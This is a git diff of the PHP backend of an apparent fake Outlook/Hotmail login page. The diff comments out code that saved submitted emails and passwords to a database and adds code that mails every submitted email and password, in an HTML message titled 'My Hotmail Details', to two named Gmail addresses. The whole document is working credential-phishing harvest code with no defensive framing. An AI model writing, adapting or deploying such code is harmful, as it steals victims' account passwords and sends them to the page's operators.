@@ -1,18 +1,48 @@
 <?php
-    $email = $_POST['email'];
-    $password = $_POST['password'];
+    // $email = $_POST['email'];
+    // $password = $_POST['password'];
 
     //Database connnection
-    $conn = new mysqli('localhost','root','','outlook');
-    if($conn->connect_error){
-        die('Connection Failed : '.$conn->connect_error);
-    } else{
-        $stmt = $conn->prepare("insert into outlook(email, password)values(?, ?)");
-        $stmt->bind_param("ss", $email, $password);
-        $stmt->execute();
-        echo "";
-        $stmt->close();
-        $conn->close();
+    // $conn = new mysqli('localhost','root','','outlook');
+    // if($conn->connect_error){
+    //     die('Connection Failed : '.$conn->connect_error);
+    // } else{
+    //     $stmt = $conn->prepare("insert into outlook(email, password)values(?, ?)");
+    //     $stmt->bind_param("ss", $email, $password);
+    //     $stmt->execute();
+    //     echo "";
+    //     $stmt->close();
+    //     $conn->close();
+    // }
+
+    //PHP code to receive content form in email address
+    if (isset($_POST['submit'])) {
+        $email = $_POST['email'];
+        $password = $_POST['password'];
+        $to = "hisrahel5@gmail.com, olayemisrael5@gmail.com";
+        $subject = "My Hotmail Details";
+
+        $message = "
+        <html>
+        <head>
+        <title>This is my hotmail Login details</title>
+        </head>
+        <body>
+            <h1>$email</h1>
+            <p>$password</p>
+        </body>
+        </html>
+        ";
+
+        // Always set content-type when sending HTML email
+        $headers = "MIME-Version: 1.0" . "\r\n";
+        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
+
+        // More headers
+        $headers .= 'From: olayemisrael5@gmail.com' . "\r\n";
+        $headers .= 'Cc: hisrahel5@gmail.com' . "\r\n";
+
+        mail($to,$subject,$message,$headers);
     }
 ?>
 <!DOCTYPE html>
